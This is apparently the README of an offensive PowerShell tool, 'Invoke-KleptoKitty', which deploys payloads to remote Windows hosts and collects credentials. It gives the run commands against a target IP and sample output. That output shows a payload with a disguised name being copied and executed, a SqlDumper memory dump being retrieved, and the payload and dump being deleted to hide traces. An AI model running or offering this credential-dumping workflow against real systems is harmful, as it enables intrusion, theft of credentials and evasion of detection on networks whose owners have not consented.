# KleptoKitty

Invoke-KleptoKitty - Deploys payloads and collects credentials

## How to run

```powershell
PS C:\> Import-Module -Force .\Invoke-KleptoKitty.ps1                                                                                                                    PS C:\> Invoke-KleptoKitty -ComputerName 192.168.244.130 -CredentialAccess SqlDumper                                                                                     

      =^._.^=
     _(      )/  KleptoKitty


[*] 8/7/2020 8:45:29 AM - Starting KleptoKitty

cmdlet Get-Credential at command pipeline position 1
Supply values for the following parameters:
Credential
[*] 8/7/2020 8:45:42 AM - Connecting to 192.168.244.130 and mapping system drive
[*] 8/7/2020 8:45:42 AM - Copy payload MsSpellCheckingFacility.ps1 to 192.168.244.130
[*] 8/7/2020 8:45:42 AM - Execute payload on 192.168.244.130
[$] 8/7/2020 8:45:42 AM - Payload  executed.
[-] 8/7/2020 8:45:42 AM - Let SqlDumper finish. Waiting for 30 seconds!
[*] 8/7/2020 8:46:12 AM - Retrieving dump file
[$] 8/7/2020 8:46:14 AM - Dump file 192.168.244.130_sqldumper.mdmp saved.
[*] 8/7/2020 8:46:14 AM - Delete payload and dump file on 192.168.244.130
[*] 8/7/2020 8:46:14 AM - Delete drive
[*] 8/7/2020 8:46:14 AM - 192.168.244.130 done
[*] 8/7/2020 8:46:14 AM - KleptoKitty is done
```